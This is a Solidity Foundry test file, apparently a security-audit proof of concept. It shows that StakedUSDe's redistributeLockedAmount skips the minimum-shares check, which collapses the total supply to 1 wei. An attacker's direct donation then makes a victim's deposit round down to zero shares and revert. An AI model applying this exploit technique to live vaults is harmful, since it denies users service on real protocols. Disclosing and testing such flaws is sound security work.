// SPDX-License-Identifier: MIT
pragma solidity >=0.8;

import "forge-std/Test.sol";

import "../../../contracts/USDe.sol";
import "../../../contracts/StakedUSDe.sol";
import "../../../contracts/interfaces/IUSDe.sol";
import "../../../contracts/interfaces/IStakedUSDe.sol";

contract MinSharesBypassPoC is Test {
    USDe public usdeToken;
    StakedUSDe public stakedUSDe;

    address public owner;
    address public whale;
    address public survivor;
    address public victim;
    address public attacker;

    bytes32 internal constant BLACKLIST_MANAGER_ROLE =
        keccak256("BLACKLIST_MANAGER_ROLE");

    bytes32 internal constant FULL_RESTRICTED_STAKER_ROLE =
        keccak256("FULL_RESTRICTED_STAKER_ROLE");

    function setUp() public {
        owner = vm.addr(1);
        whale = vm.addr(2);
        survivor = vm.addr(3);
        victim = vm.addr(4);
        attacker = vm.addr(5);

        // Deploy the real USDe token.
        usdeToken = new USDe(address(this));

        // Deploy the real StakedUSDe contract.
        vm.prank(owner);
        stakedUSDe = new StakedUSDe(
            IUSDe(address(usdeToken)),
            owner,
            owner
        );

        // Give this test contract minting permission for USDe.
        usdeToken.setMinter(address(this));

        // Allow owner to manage blacklists.
        vm.prank(owner);
        stakedUSDe.grantRole(
            BLACKLIST_MANAGER_ROLE,
            owner
        );
    }

    function test_MinSharesCanBeViolated() public {
        // ------------------------------------------------------------
        // 1. Whale deposits 100 USDe.
        // ------------------------------------------------------------

        uint256 whaleAmount = 100 ether;

        usdeToken.mint(whale, whaleAmount);

        vm.startPrank(whale);
        usdeToken.approve(address(stakedUSDe), whaleAmount);
        stakedUSDe.deposit(whaleAmount, whale);
        vm.stopPrank();

        // ------------------------------------------------------------
        // 2. Survivor deposits exactly 1 wei.
        //
        // With the initial exchange rate approximately 1:1,
        // 1 wei of USDe produces exactly 1 wei of sUSDe.
        // ------------------------------------------------------------

        usdeToken.mint(survivor, 1 wei);

        vm.startPrank(survivor);
        usdeToken.approve(address(stakedUSDe), 1 wei);
        stakedUSDe.deposit(1 wei, survivor);
        vm.stopPrank();

        assertEq(
            stakedUSDe.balanceOf(survivor),
            1 wei,
            "survivor should own 1 wei of sUSDe"
        );

        assertGt(
            stakedUSDe.totalSupply(),
            1 ether,
            "initial supply should be above MIN_SHARES"
        );

        // ------------------------------------------------------------
        // 3. Fully blacklist the whale.
        // ------------------------------------------------------------

        vm.prank(owner);
        stakedUSDe.addToBlacklist(whale, true);

        assertTrue(
            stakedUSDe.hasRole(
                FULL_RESTRICTED_STAKER_ROLE,
                whale
            )
        );

        // ------------------------------------------------------------
        // 4. Admin redistributes the whale's locked amount to address(0).
        //
        // This burns the whale's shares.
        // The important point:
        //
        // redistributeLockedAmount() does NOT call _checkMinShares().
        // ------------------------------------------------------------

        vm.prank(owner);
        stakedUSDe.redistributeLockedAmount(
            whale,
            address(0)
        );

        // ------------------------------------------------------------
        // 5. The invariant is now violated.
        //
        // Only the survivor's 1 wei remains.
        // MIN_SHARES is 1 ether.
        // ------------------------------------------------------------

        uint256 remainingSupply = stakedUSDe.totalSupply();

        assertEq(
            remainingSupply,
            1 wei,
            "only the survivor's 1 wei should remain"
        );

        assertGt(
            remainingSupply,
            0,
            "supply must remain non-zero"
        );

        assertLt(
            remainingSupply,
            1 ether,
            "MIN_SHARES invariant has been violated"
        );
    }

    function test_DonationMakesVictimDepositRevert() public {
        // First create the vulnerable low-supply state.
        test_MinSharesCanBeViolated();

        // ------------------------------------------------------------
        // Attacker donates 1,000 USDe directly to the vault.
        // This changes totalAssets without minting shares.
        // ------------------------------------------------------------

        usdeToken.mint(attacker, 1000 ether);

        vm.prank(attacker);
        usdeToken.transfer(
            address(stakedUSDe),
            1000 ether
        );

        // ------------------------------------------------------------
        // Victim has 500 USDe.
        // ------------------------------------------------------------

        usdeToken.mint(victim, 500 ether);

        uint256 victimBalanceBefore =
            usdeToken.balanceOf(victim);

        uint256 previewedShares =
            stakedUSDe.previewDeposit(500 ether);

        console.log(
            "Victim previewDeposit shares:",
            previewedShares
        );

        // The donation + collapsed supply causes the deposit
        // to round down to zero shares.
        assertEq(
            previewedShares,
            0,
            "victim deposit should calculate to zero shares"
        );

        // ------------------------------------------------------------
        // The actual deposit must revert because _deposit()
        // has the notZero(shares) modifier.
        // ------------------------------------------------------------

        vm.startPrank(victim);

        usdeToken.approve(
            address(stakedUSDe),
            500 ether
        );

        vm.expectRevert(
            IStakedUSDe.InvalidAmount.selector
        );

        stakedUSDe.deposit(
            500 ether,
            victim
        );

        vm.stopPrank();

        // ------------------------------------------------------------
        // IMPORTANT:
        // The victim's USDe never left their wallet.
        // ------------------------------------------------------------

        assertEq(
            usdeToken.balanceOf(victim),
            victimBalanceBefore,
            "victim funds must remain untouched"
        );
    }
}
